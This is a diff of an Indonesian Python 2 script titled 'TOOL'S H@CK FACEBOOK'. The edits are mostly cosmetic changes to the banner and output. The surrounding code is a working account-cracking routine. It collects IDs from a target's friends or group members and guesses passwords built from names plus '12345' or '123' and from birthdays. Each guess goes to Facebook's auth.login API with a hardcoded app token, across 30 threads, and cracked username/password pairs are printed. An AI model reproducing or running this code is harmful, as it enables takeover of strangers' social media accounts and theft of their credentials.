@@ -77,18 +77,19 @@ def login():
 	print
 	print("                                     ")
 	print("                                     ")
-	print("{}   +------------------------------+ ").format(gr)
-	print("{}   |   {}TOOL'S  H@CK  FACEBOOK {}    | ").format(gr,cy,gr)
-	print("{}   |------------------------------| ").format(gr)
-	print("{}   |   Author {} : {}Mr.XbalMeonk     | ").format(gr,re,gr)
-	print("{}   | {}  facebook{}:{} Cengir Eea       | ").format(gr,cy,re,gr)
-	print("{}   | {}  Youtube :{} Xbal Meonk       | ").format(gr,re,gr)
-	print("{}   |------------------------------| ").format(gr)
-	print("{}   |    {}SELAMAT  MENCOBA..... {}    | ").format(gr,ye,gr)
-	print("{}   +------------------------------+ ").format(gr)
+	print("{}   +================================+ ").format(gr)
+	print("{}   |    {}TOOL'S  H@CK  FACEBOOK {}     | ").format(gr,cy,gr)
+	print("{}   |            {}TERBARU            {} | ").format(gr,cy,gr)         
+	print("{}   |--------------------------------| ").format(gr)
+	print("{}   |    Author {} : {}Mr.XbalMeonk      | ").format(gr,re,gr)
+	print("{}   | {}   facebook{}:{} Cengir Eea        | ").format(gr,cy,re,gr)
+	print("{}   | {}   Youtube :{} Xbal Meonk        | ").format(gr,re,gr)
+	print("{}   |--------------------------------| ").format(gr)
+	print("{}   |     {}SELAMAT  MENCOBA.^_^. {}     | ").format(gr,ye,gr)
+	print("{}   +================================+ ").format(gr)
         print 40 * '\x1b[1;97m\xe2\x95\x90'
         print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
-        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
+        id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail/no.hp FB \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
@@ -559,7 +560,7 @@ def super():
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Crack dari daftar Teman'
-    print '\x1b[1;37;40m2. Crack dari member Grup'
+    print '\x1b[1;37;40m2. Crack dari anggota Grup'
     print '\x1b[1;31;40m0. Kembali'
     print
     pilih_super()
@@ -627,44 +628,44 @@ def pilih_super():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
+                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' >>> ' + pass1
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
+                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' >>> ' + pass1
                 else:
                     pass2 = b['first_name'] + '12345'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
+                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' >>> ' + pass2
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
+                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' >>> ' + pass2
                         else:
                             pass3 = b['last_name'] + '123'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
+                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' >>> ' + pass3
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
+                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' >>> ' + pass3
                                 else:
                                     lahir = b['birthday']
                                     pass4 = lahir.replace('/', '')
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
+                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' >>> ' + pass4
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
+                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' >>> ' + pass4
         except:
             pass
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai Cuk...'
     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
     super()
 
